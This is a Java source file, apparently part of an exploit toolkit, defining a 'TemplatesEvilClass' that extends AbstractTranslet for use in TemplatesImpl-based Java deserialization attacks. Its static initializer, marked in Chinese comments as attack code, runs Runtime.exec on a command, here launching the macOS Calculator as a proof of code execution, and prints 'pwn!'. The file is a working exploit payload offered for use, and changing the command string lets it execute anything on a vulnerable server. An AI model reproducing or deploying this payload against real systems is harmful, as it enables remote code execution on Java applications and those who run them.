package expUtils;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

import java.io.IOException;

/*
* 供TemplatesImpl 使用的poc代码
* */
public class TemplatesEvilClass extends AbstractTranslet {
    private static final String cmd = "/System/Applications/Calculator.app/Contents/MacOS/Calculator";
    static {
//        攻击代码
        System.out.println("static : pwn!");
        try {
            Runtime.getRuntime().exec(cmd);
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    public TemplatesEvilClass(){
//        攻击代码
        System.out.println("constructor: pwn!");
    }
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }

}
